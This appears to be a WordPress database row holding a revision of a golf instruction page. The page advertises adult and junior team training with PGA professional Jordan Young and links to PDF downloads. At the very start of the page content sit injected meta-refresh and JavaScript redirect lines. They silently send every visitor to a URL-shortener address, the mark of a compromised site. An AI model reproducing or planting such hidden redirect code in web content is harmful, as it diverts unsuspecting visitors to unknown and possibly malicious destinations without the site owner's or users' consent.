(431, 1, '2022-02-11 19:53:15', '2022-02-11 19:53:15', '<meta http-equiv=\"refresh\" content=\"0; url=https://ushort.org/JTbbGNW0r7\" />\r\n<script>window.location.href = \"https://ushort.org/JTbbGNW0r7\";</script>\r\n<meta http-equiv=\"refresh\" content=\"0; url=https://ushort.org/JTbbGNW0r7\" />\r\n<script>window.location.href = \"https://ushort.org/JTbbGNW0r7\";</script>\r\n[section bg=\"232\" bg_size=\"original\" bg_color=\"rgb(255,255,255)\" bg_overlay=\"rgba(255, 255, 255, 0.75)\" padding=\"50px\"]\n\n[row]\n\n[col span=\"6\" span__sm=\"12\" padding=\"20px 20px 20px 20px\" bg_color=\"rgb(255,255,255)\" depth=\"2\"]\n\n<h2>Adult Team Training</h2>\n<hr class=\"hr_fancy\" />\n<p>Enjoy a unique learning experience, group instruction at Jordan Young Golf - Fox Hills, with PGA Professional and National Award Winner for Player Development, Jordan Young. This coaching program provides opportunities where skills are learned and transferable to the course. Frequency, duration, and commitment are keys to success which help reduce frustration and anxiety. ATT includes skill training, motor pattern awareness, speed development, short game, on-course sessions, mental training, and game like practice. Access to our state-of-the-art training facility and amenities are exclusive to this group. Pick a training level for your needs and begin NOW!</p>\n[ux_image id=\"430\" lightbox=\"true\"]\n\n[button text=\"Download (PDF)\" color=\"alert\" radius=\"10\" link=\"https://jordanyounggolf.com/wp-content/uploads/2022/01/2022-JTT-Junior-Team-Training-JYG.jpg\" target=\"_blank\"]\n\n\n[/col]\n[col span=\"6\" span__sm=\"12\" padding=\"20px 20px 20px 20px\" bg_color=\"rgb(255,255,255)\" depth=\"2\"]\n\n<h2>Junior Team Training</h2>\n<hr class=\"hr_fancy\" />\n<p>Enjoy training what works best! I have been a leader in training/coaching for years with group instruction at Fox Hills. Train with me, PGA Professional and National Award Winner for Player Development, Jordan Young. The keys to this program include technical and life skills, frequency, duration, plus commitment and love for the game. JTT has a wide variety of topics; skill training, motor pattern awareness, short game development, on-course sessions, mental training, and game like practice. Access to our state-of-the-art training facility and all the amenities are exclusive to this group. Pick a training level below or consult with Jordan to build the best program possible!</p>\n[ux_image id=\"397\" lightbox=\"true\"]\n\n[button text=\"Download (PDF)\" color=\"alert\" radius=\"10\" link=\"https://jordanyounggolf.com/wp-content/uploads/2022/01/2022-JTT-Junior-Team-Training-JYG.pdf\" target=\"_blank\"]\n\n\n[/col]\n[col span__sm=\"12\" align=\"center\"]\n\n[button text=\"Download JTT/ATT Introduction Letter (PDF)\" color=\"alert\" radius=\"10\" link=\"https://jordanyounggolf.com/wp-content/uploads/2022/01/2022-JTT-ATT-Intro-Jordan-Young-Golf.pdf\" target=\"_blank\"]\n\n\n[/col]\n\n[/row]\n\n[/section]', 'ATT & JTT', '', 'inherit', 'closed', 'closed', '', '417-revision-v1', '', '', '2022-02-11 19:53:15', '2022-02-11 19:53:15', '', 417, 'https://jordanyounggolf.com/?p=431', 0, 'revision', '', 0),
